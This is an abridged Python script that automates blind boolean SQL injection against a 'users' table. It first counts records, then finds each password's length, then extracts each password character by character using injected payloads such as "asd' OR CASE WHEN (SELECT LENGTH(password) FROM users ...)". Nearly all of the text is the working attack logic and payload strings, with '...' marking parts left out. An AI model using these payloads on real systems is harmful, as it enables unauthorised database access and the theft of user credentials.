...
while not stop:
    write_console("record count {}".format(count + 1))
    count += 1
    payload_table_count = "asd' OR CASE WHEN (SELECT COUNT(*) FROM users)={} THEN true END#".format(count)
...
for offset in range(0,count):
    ...
    while not stop:
        ...
        string_length += 1
        write_console("checking data length for record {}: {}".format(offset + 1, string_length))
        payload_string_length = "asd' OR CASE WHEN (SELECT LENGTH(password) FROM users LIMIT {},1)={} THEN true END#".format(offset, string_length)
    ...
    while character_iterator <= string_length:
        ...
        while not stop and ascii_iterator < ascii_end:
            ...
            write_console("password {}: {}".format(offset + 1, ''.join(name)))
            payload_string_length = "asd' OR CASE WHEN (SELECT BINARY(SUBSTRING(password,{},1)) FROM users LIMIT {},1)=CHAR({}) THEN true END#".format(character_iterator, offset, ascii_iterator)
